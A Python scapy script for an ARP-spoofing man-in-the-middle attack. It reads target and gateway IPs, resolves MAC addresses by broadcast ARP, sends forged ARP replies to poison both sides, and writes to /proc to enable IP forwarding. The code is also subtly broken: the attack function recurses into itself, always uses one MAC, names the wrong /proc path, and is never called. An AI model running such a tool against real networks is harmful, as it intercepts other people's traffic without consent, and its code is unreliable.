import os
import sys
import time
import optparse
import scapy.all as scapy

#kali linux ip forwarding echo 1 > /proc/sys/net/ipv4/ip_forwarding

class Mitm:

    def __init__(self):
        self.parser_object = optparse.OptionParser()
        self.destination = None
        self.source = None
    def GET_USER_INPUTS(self):
        self.parser_object.add_option("-d", "--destination",
                                      dest="destination",
                                      help="Target Ip Address")
        self.parser_object.add_option("-s", "--source",
                                      dest="source",
                                      help="Source Ip Address")
        return self.parser_object.parse_args()

    def CONFIG_ATTACK(self):
        (user_inputs,argument) = self.GET_USER_INPUTS()
        self.destination = user_inputs.destination
        self.source = user_inputs.source

    def GET_TARGET_MAC_ADDRESS(self,ip):

        self.ARP_REQUEST= scapy.ARP(pdst=ip)
        self.BROADCAST_PACKET = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        self.COMBINED_PACKET = self.BROADCAST_PACKET / self.ARP_REQUEST
        self.result = scapy.srp(self.COMBINED_PACKET,timeout=1,verbose=False)[0]
        self.mac_address = self.result[0][1].hwsrc

        return self.mac_address

    def ATTACK(self,ip,gateway):
        self.ARP_RESPONSE = scapy.ARP(op=2,
                                      pdst=ip,
                                      hwdst=self.GET_TARGET_MAC_ADDRESS(self.destination),
                                      psrc=gateway)
        scapy.send(self.ARP_RESPONSE,verbose=False)
        try:
            count = 0
            while True:
                self.ATTACK(self.destination,self.source)
                self.ATTACK(self.source,self.destination)
                count+=1
                print("\rSending Packet : " + str(count) ,end="")

        except KeyboardInterrupt:
            print("[ CTRL + C ] Detected !!!")
            print("Quiting ....")
            time.sleep(3)
            self.CLEAR_TERMINAL()
        except Exception as e:
            print(f"Error Type : {e}")
            time.sleep(2)
            sys.exit()
    def CLEAR_TERMINAL(self):
        if os.name == 'nt':
            os.system('cls')
        elif os.name == 'posix':
            os.system('clear')
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forwarding")
        else:
            pass

mitm = Mitm()
mitm.CLEAR_TERMINAL()
mitm.GET_USER_INPUTS()
mitm.CONFIG_ATTACK()